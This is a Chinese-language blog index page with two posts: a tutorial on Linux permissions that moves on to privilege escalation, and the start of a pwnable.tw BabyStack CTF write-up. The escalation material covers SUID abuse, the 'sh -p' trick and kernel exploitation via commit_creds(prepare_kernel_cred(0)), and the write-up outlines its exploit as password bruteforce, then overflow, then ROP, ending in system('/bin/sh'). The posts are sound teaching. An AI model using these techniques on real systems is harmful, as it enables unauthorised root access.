<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon_io/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon_io/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon_io/favicon-16x16.png">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://google-fonts.mirrors.sjtug.sjtu.edu.cn/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"www.cameudis.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Cameudis&#39; Blog">
<meta property="og:url" content="https://www.cameudis.com/page/2/index.html">
<meta property="og:site_name" content="Cameudis&#39; Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Cameudis">
<meta property="article:tag" content="blog">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://www.cameudis.com/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Cameudis' Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Cameudis' Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Binary Hack, Computer System, Music, and whatever</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-notes">

    <a href="/notes/" rel="section"><i class="fa fa-sticky-note fa-fw"></i>notes</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/link/" rel="section"><i class="fa fa-link fa-fw"></i>links</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Linux/def2b48d2855.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Linux/def2b48d2855.html" class="post-title-link" itemprop="url">【Linux#0x01】Linux权限模型</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-11-09 23:36:16" itemprop="dateCreated datePublished" datetime="2023-11-09T23:36:16+08:00">2023-11-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-04-17 14:40:17" itemprop="dateModified" datetime="2024-04-17T14:40:17+08:00">2024-04-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
                </span>
            </span>

          
            <span id="/Tech/Linux/def2b48d2855.html" class="post-meta-item leancloud_visitors" data-flag-title="【Linux#0x01】Linux权限模型" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Linux/def2b48d2855.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Linux/def2b48d2855.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Linux系列第一篇！<br>本期介绍Linux中的权限模型，从 <code>ls -l</code> 的解释一路科普到内核漏洞的利用（什么！）</p>
<hr>
<p>由于 Linux 设计时是一个多用户系统，可能有很多人共用一个 Linux 系统，因此 Linux 中存在<strong>用户</strong>和<strong>用户组</strong>的概念，每个用户或者用户组都有一个自己的 id，每个用户可以属于多个用户组。<br>有了用户之间的区分，就可以为文件设置权限，限制不应该访问的用户的访问，于是就有了权限系统。</p>
<p>用户和用户组这两个抽象的概念，其实主要体现在两个地方：</p>
<ul>
<li>进程系统：每个进程都有自己所属的用户和用户组</li>
<li>文件系统：每个文件都有自己所属的用户和用户组，以及相应的读写权限设置</li>
</ul>
<p>可以使用 <code>getuid()</code> 系列系统调用获取当前进程的用户 id，在 shell 里可以直接输入 <code>id</code> 查看当前 shell 进程的用户和用户组 id。（这里先不提及 id 的区别，后面再进行讲解）</p>
<h2 id="文件系统中的权限模型"><a href="#文件系统中的权限模型" class="headerlink" title="文件系统中的权限模型"></a>文件系统中的权限模型</h2><p>使用命令 <code>ls -l</code> 可以查看文件的详细信息，比如：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ll</span><br><span class="line">drwxr-xr-x  4 cameudis cameudis   4096 Mar 24  2023 .cargo/</span><br><span class="line">drwx------  2 cameudis cameudis   4096 Nov  2 10:43 .ssh/</span><br><span class="line">-rw-r--r--  1 cameudis cameudis   4957 Oct 31 18:41 .bashrc</span><br><span class="line">-rw-r--r--  1 cameudis cameudis    619 Oct 31 10:11 memo.txt</span><br></pre></td></tr></table></figure>

<p>我们以第一条为例：</p>
<table>
<thead>
<tr>
<th>文件类型</th>
<th>权限信息</th>
<th>连结数</th>
<th>拥有者</th>
<th>用户组</th>
<th>文件大小</th>
<th>修改日期</th>
<th>文件名</th>
</tr>
</thead>
<tbody><tr>
<td><code>d</code></td>
<td><code>rwxr-xr-x</code></td>
<td><code>4</code></td>
<td><code>cameudis</code></td>
<td><code>cameudis</code></td>
<td><code>4096</code></td>
<td><code>Mar 24  2023</code></td>
<td><code>.cargo/</code></td>
</tr>
</tbody></table>
<p>第一个字段文件类型包括以下这些（从这里也可以看到万物皆文件的思想）：</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>文件类型</th>
</tr>
</thead>
<tbody><tr>
<td>-</td>
<td>普通文件</td>
</tr>
<tr>
<td>d</td>
<td>目录</td>
</tr>
<tr>
<td>|</td>
<td>符号链接</td>
</tr>
<tr>
<td>p</td>
<td>named pipe</td>
</tr>
<tr>
<td>c</td>
<td>字符设备</td>
</tr>
<tr>
<td>b</td>
<td>块设备</td>
</tr>
<tr>
<td>s</td>
<td>socket 文件</td>
</tr>
</tbody></table>
<p>我们可以看到，每个文件都会有一个所属的用户、一个所属的用户组。相应地，一个文件的权限设置会有三档：<strong>对于所属用户的权限</strong>、<strong>对于所属用户组中用户的权限</strong>、<strong>对于其他用户的权限</strong>。在一些权限设置工具 <code>chmod</code> 中，这三者分别简称为 <code>U</code> <code>G</code> <code>O</code>，即 User、Group、Others。</p>
<p>在 <code>ls -h</code> 看到的信息中，我们看到的 <code>rwxr--r--</code> 字符串，其实就类似一个 bit vector。前三个字符表示对于所属用户的权限，中间三个表示所属用户组中用户的权限，最后三个字符表示对于其他用户的权限。</p>
<p>比如，<code>.cargo</code> 目录归 cameudis 所有，那么 cameudis 作为拥有者，其权限是 <code>rwx</code>（Read、Write、eXecute）；而另一个用户 Jern，若他不属于 cameudis 用户组，那么他的权限是 <code>r--</code>（Read only）。</p>
<blockquote>
<p>你可能会好奇，为什么 Linux 下各种目录大小都显示为 4096：这是硬盘中用来存储目录 metadata 信息的大小，这些 metadata 有：<br>如果你需要计算目录大小，可以使用 <code>du</code> 指令，比如 <code>du -sh /tmp</code>。</p>
</blockquote>
<h3 id="修改文件权限"><a href="#修改文件权限" class="headerlink" title="修改文件权限"></a>修改文件权限</h3><p>一句废话就是：如果想要修改文件的权限，你必须拥有文件的权限。<br>在命令行中，我们最常使用的修改权限工具是 <code>chmod</code>。</p>
<p>在 <code>chmod</code> 中，最简单的用法就是：<code>chmod &lt;+/-&gt;&lt;r/w/x&gt; &lt;filename&gt;</code>，这样会给用户、组和其他人通通加上或减去某个权限，比如：<code>chmod +x a.out</code> 就能让所有人都获取执行该文件的权限。</p>
<p>在此基础上，还可以特别指定某一群体：<code>chmod [ugoa...]&lt;+/-&gt;&lt;r/w/x&gt; &lt;filename&gt;</code>。比如 <code>chmod u+x a.out</code> 就可以只给拥有者执行该文件的权限。</p>
<p>不过，根据笔者观察，大家最常用的用法是直接使用数字指定。我们知道每个文件有三组权限，所以可以用三个 3 比特的值来分别表示一个文件的三组权限。在这个 3 比特的值中，约定最高位表示 r，中间一位表示 w，最后一位表示 x。所以，<code>111</code> 就对应 <code>rwx</code>，<code>010</code> 就对应 <code>-w-</code>。</p>
<p>然后，我们再将其写为 8 进制，<code>111</code> 就会变成 <code>7</code>（如果你硬要说是更大的进制也可以），这样我们就可以用一个阿拉伯数字表示一组权限。</p>
<p>再将其推广一下之后，就可以用三个数字表达三组权限，我们列出一些经常用到的权限作为例子：</p>
<table>
<thead>
<tr>
<th>权限编码</th>
<th>权限说明</th>
</tr>
</thead>
<tbody><tr>
<td>755</td>
<td>rwxr-xr-x</td>
</tr>
<tr>
<td>600</td>
<td>rw——-</td>
</tr>
<tr>
<td>644</td>
<td>rw-r–r–</td>
</tr>
<tr>
<td>777</td>
<td>rwxrwxrwx</td>
</tr>
</tbody></table>
<p>chmod 使用这种语法来让我们快速指定权限：<code>chmod 755 ./a.out</code> </p>
<blockquote>
<p><strong>冷知识：</strong><br>在著名动漫《新世纪福音战士新剧场版》中，明日香操纵 EVA 二号机进入野兽模式时，使用的指令是 “Code 777”，这说明 EVA 二号机运行的是 Linux 操作系统⊂彡☆))∀`)<br><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/202311082023947.png" alt="chmod 777"></p>
</blockquote>
<blockquote>
<p><strong>常见的文件权限</strong><br>目录权限通常设置为755。其中7表示rwx，5表示rx。这里，x权限用于进入目录，r权限用于读取目录；换句话说，若去掉某个目录dir的x权限，则cd dir会报错；若去掉r保留x，则可以进入这个目录，但在目录中运行ls会出错；没有w权限，表示不能在目录中删除或新建文件。注意，删掉一个文件并不需要该文件的w权限，而只需要文件所在目录的w权限。一个文档文件的权限通常设置为422，即没有x权限。符号链接文件的权限为777，因为真正起作用的是链接所指向文件的权限。（来自<a target="_blank" rel="noopener" href="https://ipads.se.sjtu.edu.cn/ospi/">银杏书</a>）</p>
</blockquote>
<blockquote>
<p><strong>文件的权限被修改，对已被打开的文件会立即生效么？</strong><br>考虑如下情况：在进程 A 打开某个文件时，该文件具有可写权限，因此进程 A 以可读可写权限打开了文件；然后，文件的权限被拥有者修改为只读，那么之后当进程 A 对文件进行写操作时，会成功还是失败呢？根据前一段的描述，进程 A 会一直拥有对文件的写权限，直到关闭该文件。若系统希望对文件的权限更新立即生效，则需要在更新权限的同时，遍历所有打开文件的 fd 并做相应的处理，例如直接关闭所有权限不匹配的 fd，这样进程 A 下次进行文件操作时就会出现错误。（来自<a target="_blank" rel="noopener" href="https://ipads.se.sjtu.edu.cn/ospi/">银杏书</a>）</p>
</blockquote>
<h2 id="进程系统中的权限模型"><a href="#进程系统中的权限模型" class="headerlink" title="进程系统中的权限模型"></a>进程系统中的权限模型</h2><p>每个进程都会有 UID 和 GID，且相关数据会继承给子进程（当然满足条件就可以修改自己的 UID 和 GID，只要符合一些要求，可以到对应系统调用的 man page 中查看具体要求）：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> getuid.c</span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123; <span class="built_in">printf</span>(<span class="string">&quot;UID: %d\n&quot;</span>, getuid()); &#125;</span><br><span class="line">$ gcc -w -o getuid ./getuid.c</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1000(cameudis) gid=1000(cameudis) <span class="built_in">groups</span>=1000(cameudis),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)</span><br><span class="line">$ ./getuid</span><br><span class="line">UID: 1000</span><br></pre></td></tr></table></figure>

<p>一个进程并不是只有一个 UID（用户 ID）和一个 GID（用户组 ID），而是根据不同用途有多个。</p>
<p>在操作系统为进程准备的结构体中，一个进程包含如下几种 ID：</p>
<ul>
<li><strong>Effective（eUID、eGID）</strong>：大多数权限检查都使用这两个 ID。</li>
<li><strong>Real（UID、GID）</strong>：真正的 ID，可能与 eUID、eGID 不同，用作信号检查等。</li>
<li><strong>Saved</strong>：用于切换的 UID&#x2F;GID，在临时降权的时候用到。</li>
</ul>
<p>eUID 和 eGID 最为常用，进程是否能够打开文件等权限检查都使用 eUID 和 eGID，因此 <code>id</code> 指令默认显示的也是 eUID 和 eGID。（不过可以用 <code>-r</code> 参数指定显示 real UID&#x2F;GID）。</p>
<h3 id="SUID-amp-SGID"><a href="#SUID-amp-SGID" class="headerlink" title="SUID &amp; SGID"></a>SUID &amp; SGID</h3><p>之所以需要区分 effective ID 和 read ID，是因为在某些场景中，需要区分这两个 ID。我们设想这样一个场景（纯虚构，细节问题不要在意）：</p>
<blockquote>
<p>Jern 安装了一个 Web 服务器软件（假设服务器软件的所有者和用户组都是 Jern），想要让运维 Cameudis 也能够执行该软件，因此他就把软件文件的权限设置为 <code>r-x</code>。<br>Cameudis 开心地启动！了 Web 服务器，但是访问网站时发现无法正常访问网页。</p>
<p>原来由 Cameudis 执行的 Web 服务器进程，其 eUID 和 eGID 都是 Cameudis 的，因此这个进程没办法访问 Jern 放在目录中的 html 网页文件！</p>
</blockquote>
<p>为了解决场景中的这一问题，一个方法就是再给 Cameudis 目录中所有的文件的权限。但这种方法的缺陷在于，万一程序还需要访问未知位置的一些目录，我们可能不能一直及时地给 Cameudis 权限。<br>另一个方法就是将 Cameudis 加入 Jern 所在的用户组。这种方法挺好的，不过需要具体情况具体分析下加入之后有没有潜在危害。</p>
<p>此外，还有一种 Linux 提供的方法，这种机制允许用户在文件中加入 <code>SUID</code>、<code>SGID</code> 权限位（就和 RWX 一样），如下所示：</p>
<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/202311092333758.png"></p>
<ul>
<li><code>SUID</code> (Set-UID)：当前文件被执行时，以文件拥有者 UID 作为 eUID 而不是父进程的 eUID。</li>
<li><code>SGID</code> (Set-GID)：当前文件被执行时，以文件拥有组 GID 作为 eGID 而不是父进程的 eGID。</li>
</ul>
<blockquote>
<p>这里说当前文件被执行，显然默认了文件是可执行文件。不可执行文件被设置这两个位是可行的但并没有意义。</p>
</blockquote>
<p>因此，Jern 可以给 Web 服务器的程序文件加上 <code>SUID</code> bit，这样 Cameudis 执行 Web 服务器时，服务器进程会以 Jern 的 <code>eUID</code> 运行，从而就能够访问所有 Jern 本人可以访问的文件。</p>
<p>一个具体的例子就是 <code>sudo</code> 程序，我们可以这样查看其权限信息：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">which</span> sudo       <span class="comment"># which 让shell查找某个程序的具体位置</span></span><br><span class="line">/usr/bin/sudo</span><br><span class="line">$ ll /usr/bin/sudo</span><br><span class="line">-rwsr-xr-x 1 root root 166056 Apr  4  2023 /usr/bin/sudo*</span><br></pre></td></tr></table></figure>

<p>可以看到，sudo 的 <code>U</code> 权限是 <code>rws</code>，这里的 s 就表示 <code>SUID</code>。我们在执行 sudo 时，会以 root 用户的 <code>eUID</code> 执行，从而能够访问高权限的资源。</p>
<blockquote>
<p>使用 chmod 给文件加 SUID 和 SGID 的方法：<br><code>chmod u+s &lt;file&gt;</code><br><code>chmod g+s &lt;file&gt;</code></p>
</blockquote>
<h3 id="Sticky-bit"><a href="#Sticky-bit" class="headerlink" title="Sticky bit"></a>Sticky bit</h3><p>Sticky bit 主要用于目录，对于标记为 Sticky 的目录中的文件，只有<strong>文件的所有者与目录的所有者</strong>才能重命名或删除文件，其他行为则照常。</p>
<p>通常来说，我们用 Sticky bit 来保护一些共享的文件夹，这里的共享是指多个用户都会在这个文件夹中处理文件。比如，<code>/tmp</code> 文件夹就常常被置为 <code>Sticky</code>，来防止普通用户删除或者移动其他用户的文件：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ll /</span><br><span class="line">drwxrwxrwt  74 root root   36864 Nov  6 14:09 tmp/</span><br></pre></td></tr></table></figure>

<p>至于给非目录的普通文件置 Sticky bit，各类 Unix 系统的对待方式都不一样，比如 Linux 就是直接忽略置 Sticky 的文件。</p>
<blockquote>
<p>使用 chmod 给文件加 Sticky 的方法：<br><code>chmod o+t &lt;file&gt;</code></p>
</blockquote>
<h2 id="特殊的存在-root"><a href="#特殊的存在-root" class="headerlink" title="特殊的存在 root"></a>特殊的存在 root</h2><p>以上说的各种权限限制，<strong>都对 root 用户无效</strong>。作为 Linux 系统中的真神，root 用户和用户组都拥有特殊的 ID 0。通常为了使用 root 的力量，我们会借用 <code>sudo</code> 这个 <code>SUID</code>  程序。</p>
<p><img src="https://imgs.xkcd.com/comics/sandwich.png"></p>
<p>root 用户可以：</p>
<ul>
<li>打开任何文件，包括 <code>/proc</code> 中一些高权限的文件如 <code>kallsym</code>。</li>
<li>执行任何程序</li>
<li>切换到任何其他用户</li>
<li>调试任何程序</li>
<li>关机、重启</li>
<li>加载设备驱动等内核模块</li>
<li>……</li>
</ul>
<p>简单来说，<strong>root 用户可以控制整个系统</strong>。</p>
<p>由于 root 的力量过于强大，所以任何一个略有安全意识的人，在平时都不会以 root 用户的身份执行指令，除非必要。相关反例实在太多了，几乎每个默认 root 用户登录的人都会因此出现一些问题。（笑死）</p>
<p>既然 root 的力量如此强大，那么可想而知，如果黑客拿到了我们机器的 root 权限，那会是多么可怕的一场<strong>安全灾难</strong>。因此，接下来我们学习如何作为黑客拿到 root 权限。</p>
<h2 id="权限提升（提权）"><a href="#权限提升（提权）" class="headerlink" title="权限提升（提权）"></a>权限提升（提权）</h2><p>提权，一般就是指黑客将他们权限从普通用户提高到 root 的一类攻击，通常的提权流程是这样的：</p>
<ol>
<li>在系统上初步站稳脚跟，比如通过有漏洞的程序拿到一个 shell（pwn！）</li>
<li>找到一个可以利用的高权限服务</li>
<li>利用那个高权限服务，借助它拿到权限</li>
</ol>
<p>什么是可以利用的高权限服务呢？</p>
<ol>
<li><code>SUID</code> 程序就是一种高权限的服务，如果它存在漏洞的话，我们就可以通过利用漏洞来达成提权，比如 <code>sudo</code> 就有过非常多的 CVE，可以攻击 <code>sudo</code> 的漏洞来拿到 root 权限。</li>
<li>有一些不必要有 <code>SUID</code> 的程序，如果能够以 root 权限运行的话，会带来令人意想不到的安全风险。</li>
<li>操作系统内核显然是最高权限运行的服务了，如果内核存在漏洞，同样可以帮助我们达成提权。这就是传说中的<strong>内核漏洞利用</strong>。</li>
</ol>
<p>前者比较容易理解，就是普通的用户态程序利用而已，因此本文中我们主要介绍后两者。</p>
<h3 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h3><p>如果你发现 <code>mv</code> 程序是 <code>SUID</code> 的，你可以做到哪些事情？<br>看起来我们只能移动一些文件，但实际上，每个常见 Linux 程序的功能都可能非常强大。比如就算是简单的 <code>mv</code> 指令，也可以做到彻底的提权。</p>
<p><code>mv</code> 的提权方法，可以参考<a target="_blank" rel="noopener" href="https://medium.com/workindia-in/the-dark-side-of-mv-command-3419c1bd619">The Dark Side of <code>mv</code> Command. mv, short for MOVE has been one of the… | by Nikhil Jagtap | WorkIndia.in | Medium</a></p>
<p>更多 binary 的提权方法，可以见 <a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a>。</p>
<p>强烈推荐读者去 <a target="_blank" rel="noopener" href="https://pwn.college/fundamentals/program-misuse">pwn.college</a> 实地打几道题来试试看。</p>
<blockquote>
<p>如果 &#x2F;bin&#x2F;sh 作为一个 SUID 程序运行，即 eUID 和 rUID 不同，那么它会主动降权限，将 eUID 设置成 rUID。这就是一种应对 SUID 提权的非常简单的缓解措施。<br>遇到这种情况，只要加上 <code>-p</code> 参数即可。</p>
</blockquote>
<h3 id="内核漏洞"><a href="#内核漏洞" class="headerlink" title="内核漏洞"></a>内核漏洞</h3><p>我们知道，操作系统不过就是一个用户程序与资源的管理器而已，它同样也是一个由程序员写成的程序，操作系统也会有漏洞。</p>
<p>我们平常说的操作系统，通常包括了许多东西，比如桌面系统。不过，这里我们要关注的是一个操作系统真正重要的东西——<strong>内核</strong>（<strong>kernel</strong>，台湾称为<strong>核心</strong>）。</p>
<p>内核是一个运行在更高级别的程序，我们刚刚提到的各种机制，包括文件系统、进程系统，这些系统的实现统统位于内核之中。比如我们刚刚提到了 <code>eUID</code>、Real <code>UID</code>，这些东西统统都是内核中为每个进程准备的结构体中的一个字段。</p>
<p>如果读者学过 OS，那么就会知道用户态程序和内核交互的最常见的方法就是通过<strong>系统调用</strong>。因此，如果系统调用涉及的某段代码中存在漏洞，我们就能<strong>从用户程序攻击内核</strong>。（这就是为什么内核 pwn 的 exp 都是一个 C 程序，自己编写软件来攻击内核显然是最方便的）</p>
<p>提权是攻击内核最常见的目的之一。如果我们控制了内核，比如劫持了控制流，我们就可以去调用内核中存在的函数，将当前进程的权限提高至 root。</p>
<p>具体来说，我们一般会控制内核执行 <code>commit_creds(prepare_kernel_cred(0))</code>，其中 <code>prepare_kernel_cred(0)</code> 会创建一个各个字段都是 0 的 cred 结构体，然后 <code>commit_creds()</code> 可以将当前进程的 cred 替换为参数。我们前面知道 root 拥有特殊的 id —— 0，因此调用完这两个函数后，就可以将进程权限切换为 <code>root</code>。<br>此后进程就可以想干啥就干啥了，比如起一个 root shell。</p>
<p>当然，这里只是一个小科普，内核漏洞笔者还没有入门，希望读者里能有未来挖掘或利用内核漏洞的大能|∀`)</p>
<hr>
<p>参考资料：pwn.college</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/9f086a2e9319.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Pwn/9f086a2e9319.html" class="post-title-link" itemprop="url">【Pwn#0x14】pwnable.tw BabyStack writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-10-23 19:51:17" itemprop="dateCreated datePublished" datetime="2023-10-23T19:51:17+08:00">2023-10-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:30:39" itemprop="dateModified" datetime="2024-01-11T16:30:39+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
                </span>
            </span>

          
            <span id="/Tech/Pwn/9f086a2e9319.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn#0x14】pwnable.tw BabyStack writeup" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Pwn/9f086a2e9319.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Pwn/9f086a2e9319.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本地打通了，远程……台湾太远了……爆破到一半就会不知道谁把我连接掐掉……</p>
<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/Snipaste_2023-10-23_20-43-43.jpg"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>本题主要有两个漏洞，一个是检查密码时，根据用户的输入的大小（strlen）作为 strncmp 的参数进行比较，然而这样会导致用户输入 NULL Byte 就通过检查，同时还允许了一字节一字节爆破得到正确的密码；甚至泄露密码后面的别的数据——在本题中就是程序基址。<br>另一个是一个没有检查大小的 strcpy。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>本题的流程就是先利用第一个漏洞来爆破得到栈上的密码以及 saved rbp，然后利用 strcpy 进行控制流劫持。由于 strcpy 限制 null byte 截断，所以我利用程序自己的 read wrapper 函数（CA0 处）来进行第二次写入，这次就可以写入 ROP chain。（这里调试得知 rdi 正好是栈上变量）<br>第一次写入 ROP chain，我泄露了 libc 的基址，让程序从 start 重头来过；第二次写入 ROP chain，我就直接执行 <code>system(&quot;/bin/sh&quot;)</code> 来拿到 shell。</p>
